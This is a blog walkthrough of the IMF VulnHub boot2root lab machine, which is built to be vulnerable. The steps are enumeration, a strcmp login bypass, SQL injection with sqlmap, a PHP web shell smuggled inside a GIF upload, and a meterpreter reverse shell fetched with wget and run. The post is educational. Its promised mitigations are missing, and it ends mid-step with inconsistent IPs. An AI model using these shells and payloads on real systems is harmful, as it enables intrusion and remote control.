---
layout: post
title:  "imf: Vulnhub Walkthrough"
date:   2018-06-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [Geckom][2] and is part of a series called `IMF`. Its graded as intermediate but I rank it as intermediate to hard. As this is purely for educational purposes I'll throw in spoilers now. To exploit this machine we'll need to chain two different exploits. At the end we'll also include some mitigation strategies. Without much further ado here we go. The description of the box reads as follows.
```
Welcome to "IMF", my first Boot2Root virtual machine. IMF is a intelligence agency
that you must hack to get all flags and ultimately root. The flags start off easy
and get harder as you progress. Each flag contains a hint to the next flag. I hope
you enjoy this VM and learn something.

Difficulty: Beginner/Moderate
```
<!--more-->
## Information gathering
First things first we'll do an nmap scan:
```
nmap -sV -O -oN /root/oscp/exam/192.168.175.137/192.168.175.137.nmap 192.168.175.137
Nmap scan report for 192.168.175.137
Host is up (0.00040s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:2E:24:72 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.2, Linux 3.16 - 4.6, Linux 3.2 - 4.6, Linux 4.4
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  4 04:10:07 2017 -- 1 IP address (1 host up) scanned in 20.34 seconds
```
From this scan we can make the following deductions
1. OS - Possibly Ubuntu
2. Web application - Apache 2.4.18

Navigate to `http://imf`
![screenshot.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot.png)

We're greeted by the page above. Using curl we'll read the contents of all the page;

Reading just the comments
```
$ curl imf -s -L | grep -E '<!--' | sed -e 's/^[[:space:]]*//'
$ curl imf/projects.php -s -L | grep -E '<!--' | sed -e 's/^[[:space:]]*//'
$ curl imf/contact.php -s -L | grep -E '<!--' | sed -e 's/^[[:space:]]*//'
```
The first two give the same result. The last one gives us a flag `flag1{YWxsdGhlZmlsZXM=}`
```
  $ echo YWxsdGhlZmlsZXM= | base64 -d
    allthefiles
```
![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 5.png)

Doesn't make sense but we keep digging.
Next step would be to read the HTML text.
Use the html2text and read what it says.
On `imf/contact.php`, we get some email addreses:
```
curl imf/contact.php -s -L | html2text -width '99' | uniq
 **** Roger S. Michaels ****
 rmichaels@imf.local
 Director
 **** Alexander B. Keith ****
 akeith@imf.local
 Deputy Director
 **** Elizabeth R. Stone ****
 estone@imf.local
 Chief of Staff
```
This might come in handy later.
Hit `Ctrl + u` to view source and notice that the js scripts have strange names.
We'll use curl to examine all sorts of links that may appear on the page;
```
$ curl imf -s -L | grep "title\|href\|src" | sed -e 's/^[[:space:]]*//'
$ curl imf/contact.php -s -L | grep "title\|href\|src" | sed -e 's/^[[:space:]]*//'
$ curl imf/projects.php -s -L | grep "title\|href\|src" | sed -e 's/^[[:space:]]*//'

$ curl imf/projects.php -s -L | grep "title\|href\|src" | sed -e 's/^[[:space:]]*//'
 <title>IMF - Homepage</title>
 <link rel="stylesheet" href="css/bootstrap.min.css">
 <link rel="stylesheet" href="css/font-awesome.min.css">
 <link rel="stylesheet" href="css/main.css">
 <link rel="stylesheet" href="css/animate.css">
 <link rel="stylesheet" href="css/responsive.css">
 <script src="js/vendor/modernizr-2.6.2.min.js"></script>
 <script src="js/vendor/jquery-1.10.2.min.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
 <script src="js/XUnRhVzVwYzNS.js"></script>
 <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
 <a href="#" class="logo">
 <img src="images/logo.png" alt="">
 <li><a href="index.php">Home</a></li>
 <li><a href="#">Projects</a></li>
 <li><a href="contact.php">Contact Us</a></li>
 <h2 class="title">Current Projects</h2>
 <img class="img-responsive" src="images/brain.jpg" alt="">
 <a class="footer-logo"href="#">
 <img class="img-responsive" src="images/logo.png" alt="">
 ```
 What stands out are these 3 javascript links, look like base64
```
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```
We grab them one at a time;
```
$ echo ZmxhZzJ7YVcxbVl | base64 -d
flag2{aW1mYbase64: invalid input
$ echo XUnRhVzVwYzNS | base64 -d
]Iх\����base64: invalid input   
$ echo eVlYUnZjZz09fQ== | base64 -d
yYXRvcg==}
```
The two == sign at the end points to it being possibly base64.
Combining all three and checking it;
```
$ echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}base64:

$ echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -d
imfadministrator
```
We shall assume this is part of the url. We append and navigate to the page.

`http://192.168.175.133/imfadministrator/`

![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 2.png)

We could try
1. sqlinjection
2. bruteforce

Before either lets attempt some further enumeration. Just like before we shall view the source (Ctrl+u)

```
<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```
Close attention to the comments. This means SQLi is not an option.
We left with option 2.

Remember earlier we got some usernames;
One of them happens to be called **** Roger S. Michaels ****. Hint hint the comments have a Roger as well. So prolly we could try;
```
rmichaels@imf.local
akeith@imf.local
estone@imf.local
```
Bruteforce would be an option but we dont know how long it might take. What other options do have? We know that we running php.
```
HTTP/1.1 200 OK
Date: Mon, 25 Sep 2017 05:55:16 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: PHPSESSID=i90casbe0kgsqkrj6lf7egsp66; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```
Since its not using SQL, there are two other ways possible ways for authentication.

1. __strcmp__
2. __==__

There exists a little trick to bypass the `strcmp` authentication. If you turn
the string to an array and compare it, the result is zero. Hence;
`name="pass" becomes
name="pass[]"`
We'll modify the source pages as follows:
```
<form method="POST" action="">
<label>Username:</label><input name="user" value="" type="text"><br>
<label>Password:</label><input name="pass[]" value="" type="password"><br>
<input value="Login" type="submit">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```

We're in and are met by another flag `flag3{Y29udGludWVUT2Ntcw==}`;
![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 3.png)

Looks like base64. We decode as before
```
$ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
```
We then proceed to the CMS. Poking and proding we discover that the pages seem to be loading from a database. Adding a quote to the url:
`http://192.168.175.133/imfadministrator/cms.php?pagename=disavowlist'`
breaks the page. Buyaa, this page may be vulnerable to SQLinjection we quickly whip out SQLmap as well as Burp. We run curl as well to view the page headers.
```
curl -I http://192.168.175.133/imfadministrator/cms.php?pagename=disavowlist
HTTP/1.1 200 OK
Date: Mon, 25 Sep 2017 06:11:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: PHPSESSID=hge93jbl98enfaevd98davl6e5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```
Save the GET request we get from Burp and run.
```
sqlmap -o -r imf.req --batch
...
 parameter: pagename (GET)                                                                                
 Type: boolean-based blind                                                                            
 Title: AND boolean-based blind - WHERE or HAVING clause                                              
 Payload: pagename=upload' AND 6741=6741 AND 'bwsY'='bwsY
We now know the pagename parameter is vulnerable. Further we can better identify the box;

 [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 16.04 (xenial)
 web application technology: Apache 2.4.18
 back-end DBMS: MySQL >= 5.0
```
Lets dump the database;
```
sqlmap -o -r imf.req --batch --dump
```
![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 6.png)

This shows an extra item that hadn't been linked __tutorials-incomplete__
![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 7.png)

Navigating to this, gives a QR image . Use a QR reader to read. This gives a flag in base64. Decode and we end up with ;

__uploadr942__

__http://192.168.175.133/imfadministrator/uploadr942.php__

This is the upload page. However, we still don't know where the file is uploaded to and what its name in the upload directory. Hence, we go hunting  for an upload directory;

$ dirb http://imf/imfadministrator

![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 8.png)

`http://imf/imfadministrator/uploads/` looks interesting

Navigating to this address returns a 403. Hence, it exists and access to it is restricted.

Now let try to do some uploads,

__.php, .txt, .html, .pdf - rejected__

__.jpg, .pdf, png, gif - all accepted__

Over we go to Burp to manipulate. First create the gif as follows:
```
$ echo 'FFD8FFEo' | xxd -r -p > my_img.gif

$ echo '<?php phpinfo(); ?>' >> my_img.gif

```
All these payloads failed.
```
$ echo <?php echo shell_exec($_GET['e']); ?> >>  my_img.gif
Error: CrappyWAF detected malware. Signature: exec function php detected

$ echo <?php echo passthru($_GET['cmd']); ?> >>  my_img.gif
Error: CrappyWAF detected malware. Signature: passthru php function detected

$ echo '<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' >>  my_img.gif

Error: CrappyWAF detected malware. Signature: system php function detected
```
Pentest monkey php reverse shell
Bursted as well
  `Throws fsockopen detected`

We know that for php or generally linux;
echo `ls` works as well as ls.
We can use `backticks` for execution. Hence we'll need to re-write the php payload
The following worked

We upload the following php script. As stated earlier we create a gif starting with gi89a. Then append the payload;
```
$ echo <?php $cmd=$_GET['cmd']; echo `$cmd`; ?> >>  my_img.gif
or
$ echo <?php $cmd=$_REQUEST['cmd']; echo `$cmd`; ?> >>  my_img.gif
```

To execute the commands we enter the following;

`http://192.168.175.140/my_img.php?cmd=ls` fails to execute.

Upon inspecting the source we discover some characters in the comments. Trying these characters as the filename, we get the file. We can conclude the files are renamed after being uploaded.

```
<!-- 9f32c31a95bf --><form id="Upload" action="" enctype="multipart/form-data" method="post">

http://192.168.175.140/9f32c31a95bf.php?cmd=ls
9f32c31a95bf is the new name for the file.
```
Once we in we get
```
flag5_abc123def.txt
YWdlbnRzZXJ2aWNlcw==
echo YWdlbnRzZXJ2aWNlcw== | base64 -d
agentservices

```
Hopefully come in handy at some point.
First things first we'll try get a proper shell using metasploit
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.227.135 LPORT=1234 -f elf > shell.elf

use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.109.128
set LPORT 1234
set ExitOnSession false
exploit -j -z
```
Get the payload;
```
wget http://192.168.227.135/shell.elf -O /tmp/shell.elf && chmod 744 /tmp/shell.elf && cd /tmp && ./shell.elf
wget http://10.11.0.250/shell.elf -O /tmp/shell.elf ; chmod 744 /tmp/shell.elf ; cd /tmp ; ./shell.elf

wget http://192.168.227.135/LinEnum.sh -O /dev/shm ; chmod 744 /dev/shm ; cd /tmp ; ./shell.elf
```
Executing this gives us a meterpreter session.

We check the services that are running .

![screenshot 5.png](/assets/images/posts/imf-vulnhub-walkthrough/screenshot 4.png)

```
netstat -antup

tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -              
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN      -            
```
We see there are two services runnnig locally. One is mysql and the other requires further investigation.

We then grep the /etc/services to further enumerate
```
$ cat /etc/services | grep 7788
agent7788/tcp# Agent service
```
This turns out to be an Agent service

As earlier mentioned the flag was pointing us to the services
Checking out the service
```
$ which agent
/usr/local/bin/agent
$ ls /usr/local/bin/
access_codes  agentrm
$ cat /usr/local/bin/access_codes
SYN 7482,8279,9467
-
```
This may indicate that we may need to do some port knocking. When we check the services running under root we find.

__/usr/sbin/knockd -d__

This further points us in the direction of port knocking.

Start the inspection

__ltrace agent__

__strace agent__

strings agent: This gives some variables that offer a point of insertion.

Once we have established this we have either of 2 options
1. __port forwarding__
2. __port knocking__

We'll go portforward, remember earlier we had got a meterpreter shell. We'll use this to do the port forwarding. And check this file for buffer overflow.

___ssh -R 7788:192.168.227.145:7788 root@192.168.227.135___

This means you're forwarding a remote port to your machine. Maybe

[1]: https://www.vulnhub.com/entry/imf-1,162/
[2]: https://twitter.com/@g3ck0m
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
